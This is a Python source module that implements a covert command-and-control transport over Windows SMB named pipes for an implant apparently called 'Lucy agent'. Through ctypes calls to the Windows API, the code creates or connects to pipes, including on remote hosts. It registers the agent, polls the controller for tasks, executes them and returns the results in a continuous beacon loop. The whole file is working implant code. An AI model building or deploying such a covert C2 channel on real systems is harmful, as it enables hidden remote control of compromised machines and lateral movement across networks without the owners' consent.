"""
SMB named pipe beacon transport for Lucy agent.

Implements a covert C2 channel over Windows named pipes (SMB).  Supports
both *server mode* (the agent creates the pipe and the C2 connects) and
*client mode* (the agent connects to a pipe created by the C2 server).

Uses ctypes to call the Windows API directly — no external dependencies.

os_compat = ["Windows"]
dependencies = []
"""
import json
import logging
import threading
import time

logger = logging.getLogger("lucy_agent.smb")

# ---------------------------------------------------------------------------
# Windows API via ctypes (imported lazily so the module can be imported
# on non-Windows for testing without crashing at import time)
# ---------------------------------------------------------------------------

_kernel32 = None
PIPE_BUF = 65536

# Windows constants
PIPE_ACCESS_DUPLEX = 0x00000003
PIPE_TYPE_BYTE = 0x00000000
PIPE_READMODE_BYTE = 0x00000000
PIPE_WAIT = 0x00000000
PIPE_UNLIMITED_INSTANCES = 255
INVALID_HANDLE_VALUE = -1
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
ERROR_PIPE_BUSY = 231


def _load_kernel32():
    """Lazily load kernel32.dll via ctypes."""
    global _kernel32
    if _kernel32 is not None:
        return _kernel32
    import ctypes
    from ctypes import wintypes

    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

    # CreateNamedPipeA
    _kernel32.CreateNamedPipeA.restype = wintypes.HANDLE
    _kernel32.CreateNamedPipeA.argtypes = [
        ctypes.c_char_p,  # lpName
        wintypes.DWORD,   # dwOpenMode
        wintypes.DWORD,   # dwPipeMode
        wintypes.DWORD,   # nMaxInstances
        wintypes.DWORD,   # nOutBufferSize
        wintypes.DWORD,   # nInBufferSize
        wintypes.DWORD,   # nDefaultTimeOut
        ctypes.c_void_p,  # lpSecurityAttributes
    ]

    # CreateFileA
    _kernel32.CreateFileA.restype = wintypes.HANDLE
    _kernel32.CreateFileA.argtypes = [
        ctypes.c_char_p,   # lpFileName
        wintypes.DWORD,    # dwDesiredAccess
        wintypes.DWORD,    # dwShareMode
        ctypes.c_void_p,   # lpSecurityAttributes
        wintypes.DWORD,    # dwCreationDisposition
        wintypes.DWORD,    # dwFlagsAndAttributes
        wintypes.HANDLE,   # hTemplateFile
    ]

    # WriteFile
    _kernel32.WriteFile.restype = wintypes.BOOL
    _kernel32.WriteFile.argtypes = [
        wintypes.HANDLE,            # hFile
        ctypes.c_void_p,            # lpBuffer
        wintypes.DWORD,             # nNumberOfBytesToWrite
        ctypes.POINTER(wintypes.DWORD),  # lpNumberOfBytesWritten
        ctypes.c_void_p,            # lpOverlapped
    ]

    # ReadFile
    _kernel32.ReadFile.restype = wintypes.BOOL
    _kernel32.ReadFile.argtypes = [
        wintypes.HANDLE,            # hFile
        ctypes.c_void_p,            # lpBuffer
        wintypes.DWORD,             # nNumberOfBytesToRead
        ctypes.POINTER(wintypes.DWORD),  # lpNumberOfBytesRead
        ctypes.c_void_p,            # lpOverlapped
    ]

    # ConnectNamedPipe
    _kernel32.ConnectNamedPipe.restype = wintypes.BOOL
    _kernel32.ConnectNamedPipe.argtypes = [
        wintypes.HANDLE,    # hNamedPipe
        ctypes.c_void_p,    # lpOverlapped
    ]

    # DisconnectNamedPipe
    _kernel32.DisconnectNamedPipe.restype = wintypes.BOOL
    _kernel32.DisconnectNamedPipe.argtypes = [wintypes.HANDLE]

    # CloseHandle
    _kernel32.CloseHandle.restype = wintypes.BOOL
    _kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

    # WaitForSingleObject
    _kernel32.WaitForSingleObject.restype = wintypes.DWORD
    _kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

    return _kernel32


# ---------------------------------------------------------------------------
# Pipe operations
# ---------------------------------------------------------------------------


def create_pipe(name: str) -> int:
    """
    Create a named pipe on Windows using CreateNamedPipeA.

    *name* should be a simple pipe name (e.g. "lucy_c2") — the full path
    ``\\\\.\\pipe\\<name>`` is constructed automatically.

    Returns the pipe handle (int) or raises RuntimeError on failure.
    """
    import ctypes
    from ctypes import wintypes

    k32 = _load_kernel32()
    pipe_path = f"\\\\.\\pipe\\{name}".encode("ascii")

    handle = k32.CreateNamedPipeA(
        pipe_path,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_BUF,
        PIPE_BUF,
        0,
        None,
    )

    if handle == INVALID_HANDLE_VALUE or handle is None:
        err = ctypes.get_last_error()
        raise RuntimeError(f"CreateNamedPipeA failed (error {err})")

    logger.info("Created named pipe: %s (handle=%s)", pipe_path, handle)
    return int(handle)


def connect_pipe(name: str, host: str = ".") -> int:
    """
    Connect to a named pipe on *host* (default: local machine).

    Uses CreateFileA on ``\\\\<host>\\pipe\\<name>``.

    Returns the pipe handle (int) or raises RuntimeError on failure.
    """
    import ctypes
    from ctypes import wintypes

    k32 = _load_kernel32()
    pipe_path = f"\\\\{host}\\pipe\\{name}".encode("ascii")

    # Retry loop for ERROR_PIPE_BUSY
    for attempt in range(10):
        handle = k32.CreateFileA(
            pipe_path,
            GENERIC_READ | GENERIC_WRITE,
            0,
            None,
            OPEN_EXISTING,
            0,
            None,
        )

        if handle != INVALID_HANDLE_VALUE and handle is not None:
            logger.info("Connected to pipe: %s (handle=%s)", pipe_path, handle)
            return int(handle)

        err = ctypes.get_last_error()
        if err == ERROR_PIPE_BUSY:
            # Wait and retry
            time.sleep(0.2)
            continue

        raise RuntimeError(f"CreateFileA failed for pipe '{pipe_path}' (error {err})")

    raise RuntimeError(f"Pipe '{pipe_path}' busy after retries")


def send_data(handle: int, data: bytes) -> bool:
    """
    Write *data* to a named pipe via WriteFile.

    Returns True on success, False on failure.
    """
    import ctypes
    from ctypes import wintypes

    k32 = _load_kernel32()
    written = wintypes.DWORD(0)
    buf = ctypes.create_string_buffer(data, len(data))

    ok = k32.WriteFile(
        wintypes.HANDLE(handle),
        buf,
        wintypes.DWORD(len(data)),
        ctypes.byref(written),
        None,
    )

    if not ok:
        err = ctypes.get_last_error()
        logger.warning("WriteFile failed (error %d)", err)
        return False
    return written.value == len(data)


def receive_data(handle: int, timeout: int = 30) -> bytes:
    """
    Read data from a named pipe via ReadFile.

    *timeout* is in seconds (used only for the busy-wait fallback when
    the pipe is in blocking mode).

    Returns the bytes read, or b"" on failure / timeout.
    """
    import ctypes
    from ctypes import wintypes

    k32 = _load_kernel32()
    buf = ctypes.create_string_buffer(PIPE_BUF)
    bytes_read = wintypes.DWORD(0)

    ok = k32.ReadFile(
        wintypes.HANDLE(handle),
        buf,
        wintypes.DWORD(PIPE_BUF),
        ctypes.byref(bytes_read),
        None,
    )

    if not ok:
        err = ctypes.get_last_error()
        logger.warning("ReadFile failed (error %d)", err)
        return b""

    return buf.raw[:bytes_read.value]


def close_handle(handle: int) -> None:
    """Close a pipe handle."""
    from ctypes import wintypes
    k32 = _load_kernel32()
    k32.CloseHandle(wintypes.HANDLE(handle))


def wait_for_client(handle: int) -> bool:
    """
    Block until a client connects to the named pipe (server mode).

    Returns True on connection, False on error.
    """
    from ctypes import wintypes
    k32 = _load_kernel32()
    ok = k32.ConnectNamedPipe(wintypes.HANDLE(handle), None)
    if not ok:
        import ctypes
        err = ctypes.get_last_error()
        # ERROR_PIPE_CONNECTED (535) means a client already connected
        if err == 535:
            return True
        logger.warning("ConnectNamedPipe failed (error %d)", err)
        return False
    return True


def disconnect_pipe(handle: int) -> None:
    """Disconnect a named pipe instance (server mode)."""
    from ctypes import wintypes
    k32 = _load_kernel32()
    k32.DisconnectNamedPipe(wintypes.HANDLE(handle))


# ---------------------------------------------------------------------------
# Frame helpers (length-prefixed over the pipe)
# ---------------------------------------------------------------------------


def _send_frame(handle: int, data: bytes) -> bool:
    """Send a 4-byte big-endian length prefix followed by *data*."""
    import struct
    header = struct.pack("!I", len(data))
    if not send_data(handle, header):
        return False
    if data and not send_data(handle, data):
        return False
    return True


def _recv_frame(handle: int, timeout: int = 30) -> bytes:
    """Receive a length-prefixed frame from the pipe."""
    import struct
    # Read 4-byte length header
    raw = receive_data(handle, timeout)
    if len(raw) < 4:
        return b""
    (length,) = struct.unpack("!I", raw[:4])
    if length == 0:
        return b""
    # Read remaining payload (may need multiple reads)
    payload = raw[4:]
    remaining = length - len(payload)
    while remaining > 0:
        chunk = receive_data(handle, timeout)
        if not chunk:
            break
        payload += chunk
        remaining -= len(chunk)
    return payload[:length]


# ---------------------------------------------------------------------------
# SMB Pipe Beacon
# ---------------------------------------------------------------------------


class SMBPipeBeacon:
    """SMB named pipe beacon configuration."""

    def __init__(
        self,
        pipe_name: str = "lucy_c2",
        server_name: str = ".",
        server_mode: bool = False,
    ) -> None:
        self.pipe_name = pipe_name
        self.server_name = server_name
        # server_mode=True: agent creates the pipe and waits for C2 to connect.
        # server_mode=False: agent connects to a C2-created pipe.
        self.server_mode = server_mode


# ---------------------------------------------------------------------------
# Beacon loop
# ---------------------------------------------------------------------------


class SMBPipeLoop:
    """
    SMB named pipe beacon loop.

    In *client mode* (default), the agent connects to a pipe created by
    the C2 server, polls for tasks, executes them, and sends results back.

    In *server mode*, the agent creates the pipe and waits for the C2 to
    connect, then enters the same poll/execute/report cycle.
    """

    def __init__(
        self,
        pipe_name: str = "lucy_c2",
        server_name: str = ".",
        server_mode: bool = False,
        poll_interval: float = 5.0,
    ) -> None:
        self.beacon = SMBPipeBeacon(
            pipe_name=pipe_name,
            server_name=server_name,
            server_mode=server_mode,
        )
        self.poll_interval = poll_interval
        self._stop_event = threading.Event()
        self._handle: int | None = None

    def stop(self) -> None:
        self._stop_event.set()

    def _connect(self) -> int | None:
        """Establish the pipe connection (server or client mode)."""
        try:
            if self.beacon.server_mode:
                handle = create_pipe(self.beacon.pipe_name)
                logger.info("Waiting for C2 to connect to pipe '%s'...", self.beacon.pipe_name)
                if not wait_for_client(handle):
                    close_handle(handle)
                    return None
                return handle
            else:
                handle = connect_pipe(self.beacon.pipe_name, self.beacon.server_name)
                return handle
        except Exception as exc:
            logger.warning("SMB pipe connect failed: %s", exc)
            return None

    def run(self, agent_id: str) -> None:
        """Main beacon loop.  Blocks until stop() is called."""
        logger.info("Starting SMB pipe beacon loop for agent %s", agent_id)

        while not self._stop_event.is_set():
            self._handle = self._connect()
            if self._handle is None:
                self._stop_event.wait(timeout=self.poll_interval)
                continue

            try:
                self._loop(self._handle, agent_id)
            except Exception as exc:
                logger.warning("SMB pipe loop error: %s", exc)
            finally:
                try:
                    if self.beacon.server_mode:
                        disconnect_pipe(self._handle)
                except Exception:
                    pass
                try:
                    close_handle(self._handle)
                except Exception:
                    pass
                self._handle = None

            if not self._stop_event.is_set():
                self._stop_event.wait(timeout=self.poll_interval)

    def _loop(self, handle: int, agent_id: str) -> None:
        """Inner poll/execute/report loop over an established pipe."""
        # Send initial registration
        reg = json.dumps({"type": "register", "agent_id": agent_id}).encode("utf-8")
        if not _send_frame(handle, reg):
            return

        while not self._stop_event.is_set():
            # Poll for tasks
            poll = json.dumps({"type": "poll", "agent_id": agent_id}).encode("utf-8")
            if not _send_frame(handle, poll):
                return

            raw = _recv_frame(handle, timeout=30)
            if not raw:
                self._stop_event.wait(timeout=self.poll_interval)
                continue

            try:
                msg = json.loads(raw.decode("utf-8"))
            except (json.JSONDecodeError, UnicodeDecodeError) as exc:
                logger.warning("SMB message decode error: %s", exc)
                continue

            msg_type = msg.get("type")
            if msg_type == "tasks":
                for task in msg.get("tasks", []):
                    result = self._execute_task(task)
                    result_bytes = json.dumps({
                        "type": "result",
                        "payload": result,
                    }).encode("utf-8")
                    if not _send_frame(handle, result_bytes):
                        return
            elif msg_type == "ping":
                _send_frame(handle, json.dumps({"type": "pong"}).encode("utf-8"))
            elif msg_type == "noop":
                pass

            self._stop_event.wait(timeout=self.poll_interval)

    def _execute_task(self, task: dict) -> dict:
        """Delegate task execution to the agent's execute_task if available."""
        try:
            import agent as _agent_mod
            execute = getattr(_agent_mod, "execute_task", None)
            if callable(execute):
                return execute(task)
        except Exception:
            pass
        return {
            "task_id": task.get("task_id", ""),
            "status": "failed",
            "error": "No task executor available",
            "data": None,
        }
